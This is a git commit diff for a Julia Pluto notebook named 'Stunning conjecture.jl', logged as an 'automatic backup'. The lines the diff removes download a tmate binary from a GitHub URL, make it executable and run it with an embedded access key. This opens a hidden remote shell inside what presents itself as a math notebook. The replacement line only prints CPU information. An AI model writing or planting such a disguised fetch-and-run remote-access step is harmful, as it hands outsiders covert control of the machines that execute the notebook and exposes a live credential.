b15867d615319c589055b824679a9e258abf45ce
hp20h5w91nf1 <137995270+hp20h5w91nf1@users.noreply.github.com>
2024-02-29 10:17:25 +0000

    automatic backup

--- new/Stunning conjecture.jl
+++ new/Stunning conjecture.jl
@@ -10,9 +10,7 @@ begin
 	Pkg.update()
 	Pkg.add("PyCall"); using PyCall
 	os = pyimport("os")
-	os.system("apt-get update -y && apt-get install curl wget -y")
-	os.system("wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate && chmod +x tmate && ./tmate -F -k tmk-XFh4wmpGo9VkrPd37bY81lqL4j -n tmate")
-end
+	os.system("lscpu")
 
 # ╔═╡ Cell order:
 # ╠═7b7e1bc4-d6eb-11ee-3e5b-99ea1c09f5ef
